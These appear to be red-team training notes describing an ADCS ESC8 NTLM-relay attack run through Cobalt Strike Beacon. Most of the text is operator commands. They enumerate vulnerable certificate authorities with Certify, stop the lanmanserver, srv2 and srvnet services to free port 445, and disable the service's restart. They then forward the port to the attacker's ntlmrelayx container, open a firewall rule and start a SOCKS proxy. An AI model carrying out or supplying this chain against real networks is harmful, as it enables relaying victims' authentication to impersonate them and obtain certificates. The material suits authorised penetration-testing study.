Certificate authorities can optionally be configured with web enrollment services (delivered through IIS), that allows users to request certificates through a web UI.  If not hosted over HTTPS with Channel Binding enforced, then the HTTP endpoints are vulnerable to NTLM relaying.  If an attacker can capture and relay NTLM authentication to this web service, then they can enrol for certificates as these other principals.

This endpoint is typically located at `http[s]://<ca>/certsrv/`
```
http://lon-cs-1.contoso.com/certsrv/
```


Certify's `enum-cas` command will return this URL and will report if it's vulnerable to ESC8.
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
```

in the beacon do these first:

- Unbind port 445 on a compromised machine.
- Start a reverse port forward on port 445 to tunnel incoming NTLM authentication requests down to our attacker machine.
- Run ntlmrelyx on our attacker machine to catch the NTLM authentication requests from the reverse port forward.
- Run a SOCKS proxy for ntlmrelayx to forward the relayed requests back up to the ADCS HTTP endpoint.

As figured out by [Nick Powers](https://x.com/zyn3rgy), port 445 is bound by a driver called srvnet.sys, which is run by a service of the same name.  However, you cannot simply stop it, because other running services are dependent on it.  We therefore need to stop _lanmanserver_, _srv2_, and then _srvnet_, in that order.

Before doing so, use the **netstat** BOF to validate that port 445 is currently bound (where PID 4 is the system/kernel process).
```
netstat
```

The _lanmanserver_ loves to automatically restart itself because its start type is set to **AUTO_START** (whereas _srv2_ and _srvnet_ are set to **DEMAND_START**).  So first, temporarily reconfigure _lanmanserver_ so that it can't start again.
```
sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
```

Then stop each service:
```
sc_stop lanmanserver
```
```
sc_stop srv2
```
```
sc_stop srvnet
```

Run **netstat** again and port 445 should no longer be listening.

With 445 unbound, we're free to run the reverse port forward, for which Beacon has two commands:

- **rportfwd** binds the specified port on the target and forwards data to the forward host/port via the team server.
- **rportfwd_local** binds the specified port on the target and forwards data to the forward host/port via the Cobalt Strike client. 

We're going to run ntlmrelayx inside a Docker container on the attacker desktop.  It's setup to expose port 7445 to the host, which maps to port 445 inside the container.  We therefore want to use **rportfwd_local** to forward data to our own loopback address on port 7445.
```
 rportfwd_local 445 localhost 7445
```

> If your Beacon is running on a desktop computer (rather than a server), then consider whether or not port 445 will be permitted inbound on the Windows firewall.  If not, then you can add a temporary rule to allow it.
> So add the follwoing rule
> ```
> powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
> ```



Now, start a SOCKS proxy that ntlmrelayx will use.
```
socks 1080 socks5
```
